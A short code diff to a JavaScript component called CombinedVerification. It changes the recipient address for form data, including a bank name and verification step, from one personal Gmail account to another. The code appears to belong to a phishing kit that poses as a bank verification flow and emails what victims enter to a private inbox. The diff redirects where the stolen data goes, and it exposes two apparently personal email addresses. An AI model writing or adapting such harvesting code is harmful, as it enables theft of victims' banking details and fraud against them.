@@ -46,7 +46,7 @@ export default function CombinedVerification() {
         bankName: formData.bankName,
         stepCompleted: stepNumber,
         time: new Date().toString(),
-        to_email: "ifegbesan6@gmail.com",
+        to_email: "leslieolobo@gmail.com",
         ...additionalData
       };
       
